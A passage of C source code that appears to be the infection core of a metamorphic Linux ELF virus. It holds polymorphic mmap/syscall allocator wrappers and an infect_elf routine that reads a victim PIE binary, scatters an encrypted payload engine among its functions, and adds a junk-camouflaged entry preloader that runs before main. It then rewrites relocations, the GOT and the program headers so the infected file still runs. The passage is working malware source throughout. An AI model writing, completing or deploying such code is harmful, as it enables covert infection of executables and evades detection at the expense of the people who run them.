    s[p] = 0xC3; p = p + 1;

    c = new_code_node();
    c->src = s;
    c->len = p;
    c->flags = FL_ME | FL_FREESRC | FL_STOP;
    c->oldrva = -3;
    return c;
}

// Build a calloc wrapper: calloc(count, size) = mmap(count * size).
// mmap returns zeroed pages, so no explicit zeroing needed.
//
// Polymorphic dimensions: same as malloc (PUSH order shuffled, 6 imm loads
// permuted, strict-safe junk slots). The count*size composite uses EAX as
// scratch, so EAX = 192 is one of the permuted loads done after the composite.
struct CodeNode* make_calloc_wrapper() {
    struct CodeNode* c;
    char* s;
    int p;
    int saved[4]; int save_order[4];
    int load_regs[6]; int load_vals[6]; int load_zero[6]; int load_order[6];
    int i; int j; int t;

    s = malloc(384);
    p = 0;

    saved[0] = 3;
    saved[1] = 5;
    saved[2] = 6;
    saved[3] = 7;
    p = emit_save_regs_specific(s, p, saved, 4, save_order);

    // Composite: ECX = page-round(count * size).
    // Reads [ESP+20] (count) and [ESP+24] (size); ESP stable from here to INT.
    p = poly_junk(s, p, -2);
    s[p] = 0x8B; p = p + 1; s[p] = 0x44; p = p + 1; s[p] = 0x24; p = p + 1; s[p] = 20; p = p + 1;
    s[p] = 0x0F; p = p + 1; s[p] = 0xAF; p = p + 1; s[p] = 0x44; p = p + 1; s[p] = 0x24; p = p + 1; s[p] = 24; p = p + 1;
    s[p] = 0x89; p = p + 1; s[p] = 0xC1; p = p + 1;
    s[p] = 0x81; p = p + 1; s[p] = 0xC1; p = p + 1; s[p] = 0xFF; p = p + 1; s[p] = 0x0F; p = p + 1; s[p] = 0; p = p + 1; s[p] = 0; p = p + 1;
    s[p] = 0x81; p = p + 1; s[p] = 0xE1; p = p + 1; s[p] = 0; p = p + 1; s[p] = 0xF0; p = p + 1; s[p] = 0xFF; p = p + 1; s[p] = 0xFF; p = p + 1;

    load_regs[0] = 0; load_vals[0] = 192;   load_zero[0] = 0;  // EAX = 192 (after composite — composite scratched EAX)
    load_regs[1] = 3; load_vals[1] = 0;     load_zero[1] = 1;  // EBX = NULL
    load_regs[2] = 2; load_vals[2] = 7;     load_zero[2] = 0;  // EDX = PROT_RWX
    load_regs[3] = 6; load_vals[3] = 0x22;  load_zero[3] = 0;  // ESI = MAP_PRIVATE|ANON
    load_regs[4] = 7; load_vals[4] = -1;    load_zero[4] = 0;  // EDI = -1
    load_regs[5] = 5; load_vals[5] = 0;     load_zero[5] = 1;  // EBP = 0

    i = 0;
    while (i < 6) { load_order[i] = i; i = i + 1; }
    i = 0;
    while (i < 6) {
        j = i + prng_range(6 - i);
        t = load_order[i]; load_order[i] = load_order[j]; load_order[j] = t;
        i = i + 1;
    }
    i = 0;
    while (i < 6) {
        p = poly_junk(s, p, -2);
        t = load_order[i];
        if (load_zero[t] != 0) {
            p = poly_zero_reg(s, p, load_regs[t]);
        } else {
            p = poly_load_imm(s, p, load_regs[t], load_vals[t]);
        }
        i = i + 1;
    }
    p = poly_junk(s, p, -2);

    s[p] = 0xCD; p = p + 1;
    s[p] = 0x80; p = p + 1;

    p = emit_restore_regs(s, p, save_order, 4);
    s[p] = 0xC3; p = p + 1;

    c = new_code_node();
    c->src = s;
    c->len = p;
    c->flags = FL_ME | FL_FREESRC | FL_STOP;
    c->oldrva = -3;
    return c;
}

// Build a free wrapper (no-op — mmap allocations leak but that's fine for short-lived payload).
struct CodeNode* make_free_wrapper() {
    return make_dummy_wrapper();
}

// Resolve payload extern imports: build a syscall (or dummy) wrapper per extern; never use PLT.
// Does NOT extend any sections — avoids VA shifts entirely.
// chain_tail: last node of the scatter chain (or text_chain if empty); wrappers are appended after it.
// Returns PLT VA array (slots for existing imports, -1 for wrappers to be resolved after build_elf).
int* build_plt_slot_map(struct ElfInfo* ei, char* extern_info, int extern_count,
                        int* out_n_slots, struct CodeNode* chain_tail,
                        int** out_wrappers, int* out_n_wrappers) {
    int* slots;
    int* wrappers;
    int i;
    int pos;
    char* dll_name;
    char* api_name;
    int sym_idx;
    int relplt_size;
    int plt_addr;
    int j;
    int r_info;
    char* relplt_data;
    int syscall_nr;
    int n_args;
    struct CodeNode* wrapper;
    struct CodeNode* tail;
    int n_wrappers;

    *out_n_slots = extern_count;
    *out_n_wrappers = 0;
    *out_wrappers = 0;
    if (extern_count == 0) { return 0; }

    slots = malloc(extern_count * 4);
    wrappers = malloc(extern_count * 4);  // parallel array: wrapper node per slot
    i = 0;
    while (i < extern_count) {
        slots[i] = 0;
        wrappers[i] = 0;
        i = i + 1;
    }

    if (extern_info == 0) { return slots; }
    pos = 4;

    plt_addr = read_i32(ei->sec_addr, SI_PLT * 4);
    relplt_data = read_i32(ei->sec_data, SI_RELPLT * 4);
    relplt_size = read_i32(ei->sec_size, SI_RELPLT * 4);

    tail = chain_tail;
    n_wrappers = 0;

    i = 0;
    while (i < extern_count) {
        dll_name = extern_info + pos;
        while ((extern_info[pos] & 0xFF) != 0) { pos = pos + 1; }
        pos = pos + 1;
        api_name = extern_info + pos;
        while ((extern_info[pos] & 0xFF) != 0) { pos = pos + 1; }
        pos = pos + 1;

        // malloc/free/calloc: ALWAYS use brk wrappers — payload runs from e_entry
        // before libc is initialized, so libc's malloc/free are not available.
        // Other imports: try victim's PLT first, then syscall wrappers.
        wrapper = 0;
        if (str_eq(api_name, "malloc") != 0) {
            wrapper = make_malloc_wrapper();
        } else if (str_eq(api_name, "calloc") != 0) {
            wrapper = make_calloc_wrapper();
        } else if (str_eq(api_name, "free") != 0) {
            wrapper = make_free_wrapper();
        } else {
            // Always use syscall wrappers — never PLT. The PLT uses
            // JMP *[EBX+offset] which requires EBX = .got.plt base.
            // When the engine (in RWX) calls through the API table to
            // entry code functions, EBX is NOT .got.plt. Syscall wrappers
            // use INT 0x80 directly and don't depend on EBX.
            syscall_nr = get_syscall_nr(api_name);
            if (syscall_nr >= 0) {
                n_args = get_syscall_nargs(syscall_nr);
                wrapper = make_syscall_wrapper(syscall_nr, n_args);
            } else {
                wrapper = make_dummy_wrapper();
            }
        }
        if (wrapper != 0) {
            wrapper->prev = tail;
            tail->next = wrapper;
            tail = wrapper;
            wrappers[i] = wrapper;
            slots[i] = -1;
            n_wrappers = n_wrappers + 1;
        }

        i = i + 1;
    }

    *out_wrappers = wrappers;
    *out_n_wrappers = n_wrappers;
    if (n_wrappers > 0) {
        print("  Created ");
        print_int(n_wrappers);
        print(" syscall wrappers\n");
    }

    return slots;
}

// =============================================================================
//
// Scatter & Infect Module
//
// infect_elf orchestrator.
// infect_one() is the bundle-driven engine entry below.
//
// =============================================================================

// Find the CodeNode for the payload entry point (the node at entry_off in
// the original payload code). Returns the node's newrva (final VA).
int find_scatter_entry_va(struct CodeNode* head, int scatter_entry_off) {
    struct CodeNode* c;
    c = head;
    while (c != 0) {
        if ((c->flags & FL_ME) != 0 && c->oldrva == scatter_entry_off) {
            return c->newrva;
        }
        c = c->next;
    }
    return 0;
}

// Entry preloader fixup offsets — tracked during construction for variable-length preloader
int g_bridge_gotplt1_off;
int g_bridge_picbase1_off;
int g_bridge_entry_call_off;
int g_bridge_main_disp_off;

// Main infection function: read victim, parse, disassemble, scatter, rebuild, fix
int infect_elf(char* victim_path, char* abs_data, int abs_size,
               char* bundle_buf, int bundle_sz,
               int entry_sz, int eng_sz, int pay_sz, int gen_sz,
               int bundle_key) {
    struct ElfInfo* ei;
    char* victim_data;
    int victim_size;
    char* mark;
    char* reloc_map;
    struct CodeNode* text_chain;
    struct CodeNode* scatter_chain;
    int text_node_count;
    int scatter_node_count;
    int entry_off;
    int code_size;
    char* data_ptr;
    int data_size;
    char* extern_info;
    int extern_count;
    int inserted;
    int expanded;
    char* out;
    int out_size;
    int delta;
    int* plt_slots;
    int n_plt_slots;
    int data_addr;
    int appended_data_va;
    int scatter_entry_va;
    int data_file_off;
    int bundle_va;
    int orig_data_sz;
    struct CodeNode* bridge_preloader;
    struct CodeNode* pic_shim;
    int* wrapper_nodes;
    int n_wrappers;

    // Read victim
    victim_data = read_file_linux(victim_path, &victim_size);
    if (victim_data == 0) {
        print("ERR: cannot read ");
        print(victim_path);
        print("\n");
        return 1;
    }

    // Validate
    if (validate_elf(victim_data, victim_size) == 0) {
        print("ERR: not a valid PIE ELF32: ");
        print(victim_path);
        print("\n");
        free(victim_data);
        return 1;
    }

    // Parse ELF
    ei = malloc(100);
    ei->data = victim_data;
    ei->size = victim_size;
    if (load_elf_info(ei) == 0) {
        free(victim_data);
        free(ei);
        return 1;
    }
    print_elf_info(ei);

    // Build reloc map for .text
    reloc_map = build_reloc_map(ei);

    // Disassemble victim .text
    mark = malloc(ei->text_size);
    mem_set(mark, 0, ei->text_size);
    disassemble_elf_text(ei->data + ei->text_off, ei->text_size,
                         ei->text_addr, ei->e_entry, mark);

    // Build code chain
    text_chain = build_elf_code_chain(ei->data + ei->text_off, ei->text_size,
                                       ei->text_addr, mark, reloc_map,
                                       &text_node_count);
    print("  Victim .text: ");
    print_int(text_node_count);
    print(" nodes\n");

    // Explode gap nodes (no-op when linear path is active — every byte is
    // already an instruction node)
    text_chain = explode_gap_nodes(text_chain, ei->text_addr, ei->text_size, reloc_map);

    // Detect PIC GOT-base thunks on individual nodes (CALL thunk; ADD EBX/EDI, imm32)
    {
        struct CodeNode* dc;
        int old_gotplt_va;
        int k_gp;
        int pic_count;
        k_gp = read_i32(ei->sec_shidx, SI_GOTPLT * 4);
        if (k_gp >= 0) {
            old_gotplt_va = read_i32(ei->data, ei->e_shoff + k_gp * ELF_SHDR_SZ + SH_ADDR_OFF);
            pic_count = 0;
            dc = text_chain;
            while (dc != 0) {
                if ((dc->flags & FL_ME) == 0 && dc->len == 5 && dc->src != 0
                    && (dc->src[0] & 0xFF) == 232) {  // E8 = CALL rel32
                    if (dc->next != 0 && (dc->next->flags & FL_ME) == 0) {
                        int add_op;
                        int add_reg_n;  // register index 0-7
                        int imm_off;    // offset of imm32 in ADD instruction
                        add_op = dc->next->src[0] & 0xFF;
                        add_reg_n = -1;
                        imm_off = 0;
                        // 81 C0-C7 imm32 = ADD reg, imm32 (6 bytes)
                        if (add_op == 129 && dc->next->len == 6) {
                            int modrm_b;
                            modrm_b = dc->next->src[1] & 0xFF;
                            if (modrm_b >= 192 && modrm_b <= 199) {
                                add_reg_n = modrm_b - 192;
                                imm_off = 2;
                            }
                        }
                        // 05 imm32 = ADD EAX, imm32 (5 bytes, short form)
                        if (add_op == 5 && dc->next->len == 5) {
                            add_reg_n = 0;  // EAX
                            imm_off = 1;
                        }
                        if (add_reg_n >= 0) {
                            int oimm;
                            int ret_a;
                            oimm = read_i32(dc->next->src, imm_off);
                            ret_a = dc->oldrva + 5;
                            if (ret_a + oimm == old_gotplt_va) {
                                // Verify CALL targets a thunk that sets the SAME register.
                                // get_pc_thunk.XX = 8B XX 24 C3 (MOV reg,[ESP]; RET)
                                // ADD reg n must match thunk modrm (n*8+4)
                                int call_tgt;
                                int tgt_text_off;
                                int thunk_modrm;
                                int match;
                                int expected_modrm;
                                call_tgt = dc->oldrva + 5 + read_i32(dc->src, 1);
                                match = 0;
                                expected_modrm = add_reg_n * 8 + 4;
                                if (call_tgt >= ei->text_addr && call_tgt < ei->text_addr + ei->text_size) {
                                    tgt_text_off = call_tgt - ei->text_addr;
                                    if ((ei->data[ei->text_off + tgt_text_off] & 0xFF) == 139) {  // 8B
                                        thunk_modrm = ei->data[ei->text_off + tgt_text_off + 1] & 0xFF;
                                        if (thunk_modrm == expected_modrm) { match = 1; }
                                    }
                                }
                                if (match != 0) {
                                    dc->next->flags = dc->next->flags | FL_GOTPTR;
                                    pic_count = pic_count + 1;
                                }
                            }
                        }
                    }
                }
                dc = dc->next;
            }
            print("  PIC thunks detected: ");
            print_int(pic_count);
            print("\n");
        }
    }

    // Resolve branch links (now works on ALL instruction-level nodes)
    resolve_branch_links(text_chain);

    // Disassemble abs payload
    print("Disassembling payload...\n");
    scatter_chain = disassemble_abs_scatter(abs_data, abs_size,
                                             &entry_off, &code_size,
                                             &data_ptr, &data_size,
                                             &extern_info, &extern_count,
                                             &scatter_node_count);
    if (scatter_chain == 0) {
        print("ERR: payload disassembly failed\n");
        free(mark);
        free(reloc_map);
        free(victim_data);
        free(ei);
        return 1;
    }

    // Resolve internal payload branch links
    resolve_scatter_branch_links(scatter_chain);

    // Insert PIC shim into engine code: CALL $+0; POP EBX; ADD EBX, imm32
    // after the PUSH EBX in the entry prologue (sets EBX = .got.plt for data access)
    {
        struct CodeNode* pic_entry;
        struct CodeNode* ps_node;
        char* ps_src;
        int pi;
        int found_entry;

        // Find entry node (oldrva == entry_off)
        pic_entry = scatter_chain;
        found_entry = 0;
        while (pic_entry != 0 && found_entry == 0) {
            if (pic_entry->oldrva == entry_off) { found_entry = 1; }
            else { pic_entry = pic_entry->next; }
        }
        pic_shim = 0;
        if (found_entry != 0) {
            // Find PUSH EBX (0x53) in first 10 nodes after entry
            struct CodeNode* sc;
            int sc_count;
            sc = pic_entry;
            sc_count = 0;
            while (sc != 0 && sc_count < 10) {
                if (sc->len == 1 && (sc->src[0] & 0xFF) == 0x53) {  // PUSH EBX
                    // Create 12-byte shim: E8 00 00 00 00 5B 81 C3 00 00 00 00
                    ps_src = malloc(12);
                    ps_src[0] = 0xE8;        // CALL $+0
                    ps_src[1] = 0; ps_src[2] = 0; ps_src[3] = 0; ps_src[4] = 0;
                    ps_src[5] = 0x5B;        // POP EBX
                    ps_src[6] = 0x81;        // ADD EBX, imm32 (group 1)
                    ps_src[7] = 0xC3;
                    ps_src[8] = 0; ps_src[9] = 0; ps_src[10] = 0; ps_src[11] = 0;
                    ps_node = new_code_node();
                    ps_node->src = ps_src;
                    ps_node->len = 12;
                    ps_node->flags = FL_ME | FL_FREESRC;
                    ps_node->oldrva = sc->oldrva;
                    // Insert after PUSH EBX node
                    ps_node->next = sc->next;
                    ps_node->prev = sc;
                    if (sc->next != 0) { sc->next->prev = ps_node; }
                    sc->next = ps_node;
                    pic_shim = ps_node;
                    break;
                }
                sc = sc->next;
                sc_count = sc_count + 1;
            }
        }
    }

    // Build PLT slot map + syscall wrappers (appended to payload chain tail)
    {
        struct CodeNode* chain_tail;
        chain_tail = scatter_chain;
        if (chain_tail != 0) {
            while (chain_tail->next != 0) { chain_tail = chain_tail->next; }
        } else {
            chain_tail = text_chain;
            while (chain_tail->next != 0) { chain_tail = chain_tail->next; }
        }
        plt_slots = build_plt_slot_map(ei, extern_info, extern_count, &n_plt_slots,
                                       chain_tail, &wrapper_nodes, &n_wrappers);
    }

    // Insert payload functions between victim function boundaries
    print("Scattering payload into victim .text...\n");
    scatter_chain = shuffle_scatter_functions(scatter_chain);
    prng_seed(runtime_seed());
    inserted = insert_scatter_functions(text_chain, scatter_chain);

    // Expand short jumps that overflow after scatter
    expanded = expand_short_jumps(text_chain, ei->text_addr);
    if (expanded > 0) {
        print("  Expanded "); print_int(expanded); print(" short jumps\n");
    }

    // Construct entry preloader and append to text_chain.
    //
    // Polymorphic entry preloader (variable length): run engine, then call main().
    // Core sequence:
    //   [PUSH EDX]                       ; save rtld_fini (placement varies)
    //   CALL $+0; POP EBX; [junk]; ADD EBX, gotplt1   ; PIC base → gotplt_va
    //   [PUSH EDX]; PUSH EBX             ; or PUSH EBX; PUSH EDX
    //   CALL entry                       ; engine runs
    //   POP EBX/EDX (reverse of push)    ; restore gotplt_va, rtld_fini
    //   MOV EAX, [EBX+main_disp]         ; load main from GOT
    //   POP <argc_reg> / MOV <argv_reg>, ESP / AND ESP,~F /
    //     PUSH <argv_reg> / PUSH <argc_reg> / CALL EAX
    //   <result transfer>                ; MOV / XCHG / PUSH+POP
    //   poly_load_imm EAX, 1 ; INT 0x80  ; exit syscall
    //
    // Polymorphic dimensions:
    //   pic_edx_order  — {PUSH EDX→PIC→PUSH EBX, PIC→PUSH EDX→PUSH EBX,
    //                     PIC→PUSH EBX→PUSH EDX} (3 variants)
    //   argc_reg       — ESI or EDI (2 variants)
    //   argv_reg       — ECX or EDX (2 variants; EDX overwrites rtld_fini
    //                    but we exit via INT 0x80 before atexit runs)
    //   result_form    — MOV EBX,EAX / XCHG EAX,EBX / PUSH EAX..POP EBX
    //                    (3 variants)
    //   Camouflage points 1/3/4 use a dead-reg poly_junk; camo points 2
    //   and 5 are strict-mode (live regs nearby).
    {
        struct CodeNode* tail;
        char* es_src;
        int p;
        tail = text_chain;
        while (tail->next != 0) { tail = tail->next; }
        bridge_preloader = new_code_node();
        es_src = malloc(384);
        p = 0;
        {
            int camo_scr;
            int pic_edx_order;
            int argc_reg;
            int argv_reg;
            int result_form;

            pic_edx_order = prng_range(3);
            argc_reg = 6 + prng_range(2);   // 6=ESI, 7=EDI
            argv_reg = 1 + prng_range(2);   // 1=ECX, 2=EDX
            result_form = prng_range(3);

            // -- Camo 1: before any preloader instruction. EAX/ECX/ESI/EDI dead.
            camo_scr = prng_range(4);
            if (camo_scr == 2) { camo_scr = 6; }      // 0,1,2,3 → 0,1,6,7
            if (camo_scr == 3) { camo_scr = 7; }
            p = poly_junk(es_src, p, camo_scr);

            // PUSH EDX before PIC trio (variant 0).
            if (pic_edx_order == 0) {
                es_src[p] = 0x52; p = p + 1;          // PUSH EDX
            }

            // PIC trio: CALL $+0 ; POP EBX ; [strict junk] ; ADD EBX, imm32
            es_src[p] = 0xE8; p = p + 1;              // CALL $+0
            es_src[p] = 0; p = p + 1; es_src[p] = 0; p = p + 1;
            es_src[p] = 0; p = p + 1; es_src[p] = 0; p = p + 1;
            // POP EBX — DO NOT insert junk between CALL $+0 and POP EBX
            g_bridge_picbase1_off = p;
            es_src[p] = 0x5B; p = p + 1;

            // -- Camo 2 (NEW): between POP EBX and ADD EBX. Strict mode (EBX live).
            p = poly_junk(es_src, p, -2);

            es_src[p] = 0x81; p = p + 1;              // ADD EBX, imm32
            es_src[p] = 0xC3; p = p + 1;
            g_bridge_gotplt1_off = p;
            es_src[p] = 0; p = p + 1; es_src[p] = 0; p = p + 1;
            es_src[p] = 0; p = p + 1; es_src[p] = 0; p = p + 1;

            // PUSH EDX/EBX in chosen order. PIC must complete before either is
            // pushed (PIC trio overwrites EBX); for variants 1 and 2 PUSH EDX
            // happens here rather than at the start.
            if (pic_edx_order == 1) {
                es_src[p] = 0x52; p = p + 1;          // PUSH EDX (after PIC, before EBX)
                es_src[p] = 0x53; p = p + 1;          // PUSH EBX
            } else if (pic_edx_order == 2) {
                es_src[p] = 0x53; p = p + 1;          // PUSH EBX
                es_src[p] = 0x52; p = p + 1;          // PUSH EDX (after EBX)
            } else {
                es_src[p] = 0x53; p = p + 1;          // PUSH EBX (variant 0; EDX already pushed)
            }

            // -- Camo 3: between push-stack-cache and CALL entry. Dead-reg mode.
            camo_scr = prng_range(4);
            if (camo_scr == 2) { camo_scr = 6; }
            if (camo_scr == 3) { camo_scr = 7; }
            p = poly_junk(es_src, p, camo_scr);

            // CALL entry (disp32 patched later)
            es_src[p] = 0xE8; p = p + 1;
            g_bridge_entry_call_off = p;
            es_src[p] = 0; p = p + 1; es_src[p] = 0; p = p + 1;
            es_src[p] = 0; p = p + 1; es_src[p] = 0; p = p + 1;

            // POP in reverse of push order.
            if (pic_edx_order == 2) {
                es_src[p] = 0x5A; p = p + 1;          // POP EDX (top)
                es_src[p] = 0x5B; p = p + 1;          // POP EBX
            } else {
                es_src[p] = 0x5B; p = p + 1;          // POP EBX (top)
                es_src[p] = 0x5A; p = p + 1;          // POP EDX
            }

            // -- Camo 4: after restore, before MOV EAX [EBX+disp]. Dead-reg mode.
            camo_scr = prng_range(4);
            if (camo_scr == 2) { camo_scr = 6; }
            if (camo_scr == 3) { camo_scr = 7; }
            p = poly_junk(es_src, p, camo_scr);

            // MOV EAX, [EBX+disp32] — load main from GOT
            es_src[p] = 0x8B; p = p + 1;
            es_src[p] = 0x83; p = p + 1;
            g_bridge_main_disp_off = p;
            es_src[p] = 0xF8; p = p + 1;
            es_src[p] = 0xFF; p = p + 1;
            es_src[p] = 0xFF; p = p + 1;
            es_src[p] = 0xFF; p = p + 1;

            // -- Camo 5 (NEW): after GOT load, before argc/argv handoff. Strict mode
            //    (EAX = main, EBX = gotplt_va dead-after-this; ESP-sensitive section
            //    starts immediately).
            p = poly_junk(es_src, p, -2);

            // POP <argc_reg> ; MOV <argv_reg>, ESP ; AND ESP, ~F ; PUSH <argv_reg> ; PUSH <argc_reg>
            es_src[p] = (0x58 + argc_reg) & 0xFF; p = p + 1;   // POP argc_reg
            es_src[p] = 0x89; p = p + 1;                         // MOV argv_reg, ESP
            es_src[p] = (0xE0 + argv_reg) & 0xFF; p = p + 1;
            es_src[p] = 0x83; p = p + 1;                         // AND ESP, 0xFFFFFFF0
            es_src[p] = 0xE4; p = p + 1;
            es_src[p] = 0xF0; p = p + 1;
            es_src[p] = (0x50 + argv_reg) & 0xFF; p = p + 1;   // PUSH argv_reg
            es_src[p] = (0x50 + argc_reg) & 0xFF; p = p + 1;   // PUSH argc_reg
            es_src[p] = 0xFF; p = p + 1;                         // CALL EAX
            es_src[p] = 0xD0; p = p + 1;

            // Result transfer (EAX = main's return → EBX for SYS_exit arg).
            if (result_form == 0) {
                // MOV EBX, EAX
                es_src[p] = 0x89; p = p + 1;
                es_src[p] = 0xC3; p = p + 1;
                p = poly_load_imm(es_src, p, 0, 1);
            } else if (result_form == 1) {
                // XCHG EAX, EBX (1 byte; old EBX = gotplt_va is now in EAX, discarded)
                es_src[p] = 0x93; p = p + 1;
                p = poly_load_imm(es_src, p, 0, 1);
            } else {
                // PUSH EAX ; poly_load_imm EAX, 1 ; POP EBX
                es_src[p] = 0x50; p = p + 1;
                p = poly_load_imm(es_src, p, 0, 1);
                es_src[p] = 0x5B; p = p + 1;
            }

            // INT 0x80
            es_src[p] = 0xCD; p = p + 1;
            es_src[p] = 0x80; p = p + 1;
        }
        bridge_preloader->src = es_src;
        bridge_preloader->len = p;
        bridge_preloader->flags = FL_ME | FL_FREESRC | FL_STOP;
        bridge_preloader->oldrva = -3;
        tail->next = bridge_preloader;
        bridge_preloader->prev = tail;
    }

    // Add placeholder R_386_RELATIVE entries BEFORE build_elf.
    //   header.base_addr — patched at rs - 2*ELF_REL_SZ
    //   g_bundle_header  — patched at rs - ELF_REL_SZ (LAST)
    if (bundle_sz > 0 && g_bundle_header_off >= 0) {
        char* rd;
        int rs;
        rd = read_i32(ei->sec_data, SI_RELDYN * 4);
        rs = read_i32(ei->sec_size, SI_RELDYN * 4);
        // header.base_addr placeholder
        write_i32(rd, rs + R_OFFSET_OFF, 0);
        write_i32(rd, rs + R_INFO_OFF, elf_r_info(0, R_386_RELATIVE));
        rs = rs + ELF_REL_SZ;
        // g_bundle_header placeholder
        write_i32(rd, rs + R_OFFSET_OFF, 0);
        write_i32(rd, rs + R_INFO_OFF, elf_r_info(0, R_386_RELATIVE));
        rs = rs + ELF_REL_SZ;
        write_i32(ei->sec_size, SI_RELDYN * 4, rs);
    }

    // Build output ELF with scattered payload + entry preloader
    print("Building output ELF...\n");
    out = build_elf(ei, text_chain, &out_size);

    // Fix branches (victim + payload, linked + unlinked)
    fix_branches(out, read_i32(ei->sec_offset, SI_TEXT * 4), text_chain);

    // Fix .got.plt, .rel.dyn, .rel.plt, .dynamic, .dynsym
    fix_got_plt_contents(out, ei, text_chain);
    fix_rel_dyn(out, ei, text_chain, out_size);
    fix_relative_values(out, ei, text_chain, out_size);
    fix_rel_plt(out, ei);
    fix_dynamic(out, ei);
    fix_dynsym(out, ei, text_chain);

    // Fix victim PIC thunks, GOT-relative .text references, and jump tables
    fix_pic_thunks_from_nodes(out, ei, text_chain);
    fix_init_fini_calls(out, ei, text_chain);
    fix_pic_text_refs(out, ei, text_chain);
    fix_rodata_jump_tables(out, ei, text_chain);

    // === Payload DATA in new RW PT_LOAD segment ===
    {
        int scatter_data_off;
        int scatter_data_va;
        int scatter_data_total;
        int text_file_off;
        int gotplt_va;
        int null_ph_off;
        int i_ph;
        int found_null;

        // Compute VA for data segment: page-aligned after all existing segments
        scatter_data_va = 0;
        i_ph = 0;
        while (i_ph < ei->e_phnum) {
            int ph; int pt; int pva; int pmsz; int pfsz;
            ph = ELF_EHDR_SZ + i_ph * ELF_PHDR_SZ;
            pt = read_i32(out, ph + P_TYPE_OFF);
            if (pt == 1) {
                pva = read_i32(out, ph + P_VADDR_OFF);
                pmsz = read_i32(out, ph + P_MEMSZ_OFF);
                pfsz = read_i32(out, ph + P_FILESZ_OFF);
                if (pmsz < pfsz) { pmsz = pfsz; }
                if (pva + pmsz > scatter_data_va) { scatter_data_va = pva + pmsz; }
            }
            i_ph = i_ph + 1;
        }
        scatter_data_va = (scatter_data_va + 65535) & (~4095);
        scatter_data_off = (out_size + 4095) & (~4095);
        // Reserve space for BundleHeader after bundle.
        // Layout: [data_size][bundle_sz][header_align_pad][header_total]
        int hdr_n_desc;
        int hdr_total;
        int hdr_align_pad;
        int hdr_off_in_seg;
        int hdr_va;
        hdr_n_desc = 3;  // ENTRY + ENGINE + GENOME (integrator carries these always)
        if (pay_sz > 0) { hdr_n_desc = hdr_n_desc + 1; }
        hdr_total = 32 + hdr_n_desc * 16;
        hdr_align_pad = (4 - ((data_size + bundle_sz) & 3)) & 3;
        scatter_data_total = data_size + bundle_sz + hdr_align_pad + hdr_total;
        hdr_off_in_seg = data_size + bundle_sz + hdr_align_pad;
        data_addr = scatter_data_va;
        hdr_va = scatter_data_va + hdr_off_in_seg;

        // Grow output buffer for data segment
        {
            char* new_out;
            int new_total;
            new_total = scatter_data_off + scatter_data_total;
            new_out = malloc(new_total + 4096);
            mem_copy(new_out, out, out_size);
            mem_set(new_out + out_size, 0, new_total - out_size + 4096);
            free(out);
            out = new_out;
        }

        // Write engine data + user payload data + bundle
        if (data_size > 0 && data_ptr != 0) {
            mem_copy(out + scatter_data_off, data_ptr, data_size);
        }
        if (bundle_sz > 0 && bundle_buf != 0) {
            mem_copy(out + scatter_data_off + data_size, bundle_buf, bundle_sz);
        }

        // Emit BundleHeader + descriptors after the (encrypted) bundle bytes.
        bundle_va = data_addr + data_size;
        if (bundle_sz > 0) {
            int hp_foff;
            int hdi;
            int hboff;
            int reldyn_off;
            int reldyn_sz;
            hp_foff = scatter_data_off + hdr_off_in_seg;
            write_i32(out, hp_foff +  0, META_MAGIC);
            write_i32(out, hp_foff +  4, META_VERSION);
            write_i32(out, hp_foff +  8, hdr_total);
            write_i32(out, hp_foff + 12, hdr_n_desc);
            write_i32(out, hp_foff + 16, bundle_va);     // base_addr (R_386_RELATIVE applies)
            write_i32(out, hp_foff + 20, bundle_sz);     // payload_size
            write_i32(out, hp_foff + 24, bundle_key);    // key
            write_i32(out, hp_foff + 28, 0);             // flags_reserved
            hdi = 0;
            hboff = 0;
            write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_ENTRY);
            write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
            write_i32(out, hp_foff + 32 + hdi*16 +  8, entry_sz);
            write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);
            hdi = hdi + 1; hboff = hboff + entry_sz;
            write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_ENGINE);
            write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
            write_i32(out, hp_foff + 32 + hdi*16 +  8, eng_sz);
            write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);
            hdi = hdi + 1; hboff = hboff + eng_sz;
            if (pay_sz > 0) {
                write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_PAYLOAD);
                write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
                write_i32(out, hp_foff + 32 + hdi*16 +  8, pay_sz);
                write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);
                hdi = hdi + 1; hboff = hboff + pay_sz;
            }
            write_i32(out, hp_foff + 32 + hdi*16 +  0, BC_GENOME);
            write_i32(out, hp_foff + 32 + hdi*16 +  4, hboff);
            write_i32(out, hp_foff + 32 + hdi*16 +  8, gen_sz);
            write_i32(out, hp_foff + 32 + hdi*16 + 12, 1);

            // Patch g_bundle_header_off slot in entry's .data → header VA,
            // then fill the two R_386_RELATIVE placeholders reserved above:
            //   - header.base_addr (2ND-LAST)  : ld.so adds load_base to bundle_va
            //   - g_bundle_header   (LAST)     : ld.so adds load_base to hdr_va
            // Without these, the .data values stay relative and bundle_open's
            // XOR derefs an unmapped low address → SIGSEGV.
            if (g_bundle_header_off >= 0) {
                write_i32(out, scatter_data_off + g_bundle_header_off, hdr_va);
                reldyn_off = read_i32(ei->sec_offset, SI_RELDYN * 4);
                reldyn_sz = read_i32(ei->sec_size, SI_RELDYN * 4);
                write_i32(out, reldyn_off + reldyn_sz - ELF_REL_SZ + R_OFFSET_OFF,
                          data_addr + g_bundle_header_off);
                write_i32(out, reldyn_off + reldyn_sz - 2 * ELF_REL_SZ + R_OFFSET_OFF,
                          hdr_va + 16);
            }
        }

        // Convert PT_NULL to PT_LOAD RW for data segment
        found_null = 0;
        i_ph = 0;
        while (i_ph < ei->e_phnum && found_null == 0) {
            null_ph_off = ELF_EHDR_SZ + i_ph * ELF_PHDR_SZ;
            if (read_i32(out, null_ph_off + P_TYPE_OFF) == 0) { found_null = 1; }
            i_ph = i_ph + 1;
        }
        if (found_null != 0) {
            write_i32(out, null_ph_off + P_TYPE_OFF, 1);
            write_i32(out, null_ph_off + P_OFFSET_OFF, scatter_data_off);
            write_i32(out, null_ph_off + P_VADDR_OFF, scatter_data_va);
            write_i32(out, null_ph_off + P_PADDR_OFF, scatter_data_va);
            write_i32(out, null_ph_off + P_FILESZ_OFF, scatter_data_total);
            write_i32(out, null_ph_off + P_MEMSZ_OFF, scatter_data_total);
            write_i32(out, null_ph_off + P_FLAGS_OFF, 6);  // PF_R | PF_W
            write_i32(out, null_ph_off + P_ALIGN_OFF, 4096);
        }
